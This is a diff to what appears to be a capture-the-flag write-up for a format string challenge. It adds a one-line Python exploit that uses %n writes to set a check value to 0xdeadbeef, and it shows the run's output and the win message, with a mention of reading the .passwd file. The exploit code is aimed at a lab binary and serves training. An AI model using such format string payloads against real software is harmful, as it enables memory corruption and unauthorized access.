@@ -109,9 +109,8 @@ the result
 ./ch14 `cat input`
 check at 0xffffd648
 argv[1] = [H���%48875d%9$n]
-
 You are on the right way !
-fmt=[H���                                                                                                                           ]
+fmt=[H���                                                                                                                         ]
 check=0xbeef
 ```
 we get 0xbeef 
@@ -161,3 +160,13 @@ $
 
 Now we can  cat .passwd!! GLHF!
 
+the following script in 1 line
+```python
+./ch14 $(python -c 'print "\x38\xfb\xff\xbf\x3a\xfb\xff\xbf"+"%48871d%9$n%8126d%10$n"')
+check at 0xbffffb38
+argv[1] = [x���z���%48871d%9$n%8126d%10$n]
+fmt=[]
+check=0xdeadbeef
+Yeah dude ! You win !
+$ 
+```
